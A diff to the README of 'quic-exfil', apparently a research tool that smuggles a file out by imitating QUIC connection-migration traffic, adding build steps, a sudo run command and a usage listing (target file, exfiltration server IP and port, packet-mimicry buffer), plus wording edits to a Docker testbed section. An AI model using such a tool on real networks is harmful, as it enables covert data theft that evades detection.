@@ -47,6 +47,34 @@ brew install libpcap
 ```
 
 
+## Build
+
+```sh
+cargo build --release
+```
+
+## Run
+
+```sh
+sudo ./target/release/quic-exfil
+```
+
+```sh
+Usage: quic-exfil [OPTIONS]
+
+Options:
+  -i, --interface <INTERFACE>  Network interface name [default: en1]
+  -t, --target <TARGET>        Target file to exfiltrate [default: images/sample.jpg]
+  -f, --filter <FILTER>        Pcap capture filter [default: udp dst port 443]
+  -d, --dst <DST>              Exfiltration server destination IP [default: 192.0.2.100]
+  -p, --port <PORT>            Exfiltration server destination port [default: 443]
+  -b, --buffer <BUFFER>        Packet buffer. Specifies how many QUIC packets should be captured and analyzed before attempting to send the first exfiltration packet. Required to mimic payload lengths of previously seen traffic [default: 1000]
+  -n, --number <NUMBER>        Number of packets to be exfiltrated per simulated connection migration [default: 100]
+  -h, --help                   Print help
+  -V, --version                Print version
+
+```
+
 
 
 ## Experimental Testbed
@@ -63,7 +91,7 @@ docker compose up --build
 
 This will build the image and launch 16 instances of the quicexfil container.
 
-You will see console output showing accessible noVNC URLs (e.g. https://172.19.0.8:6901) for each container. These can be opened in your host browser (preferably Firefox) to interact with each container’s desktop environment.
+You will see console output showing accessible noVNC URLs (e.g., https://172.19.0.8:6901) for each container. These can be opened in your host browser to interact with each container’s desktop environment.
 
 You can connect to each container using the noVNC lite clients, for example:
 
@@ -71,11 +99,11 @@ You can connect to each container using the noVNC lite clients, for example:
 https://172.19.0.8:6901
 ```
 
-Log in with the default password <i>headless</i> and open Firefox in each container to manually generate QUIC traffic (e.g., by visiting sites like Cloudflare or Google).
+Log in with the default password <i>headless</i> and open your browser in each container to manually generate QUIC traffic (e.g., by visiting sites like Cloudflare or Google, which already use the QUIC protocol).
 
-Running the benign QUIC Server on the Host VM:
+Running the benign QUIC server on the Host VM:
 
-The base virtual machine (host) runs the quiche server to listen for and accept QUIC connections (including active migrations):
+The benign QUIC server was used to create fingerprints of benign connection migrations. The base virtual machine (host) runs the quiche server to listen for and accept QUIC connections (including active migrations):
 
 ```sh
 ./target/release/quiche-server \
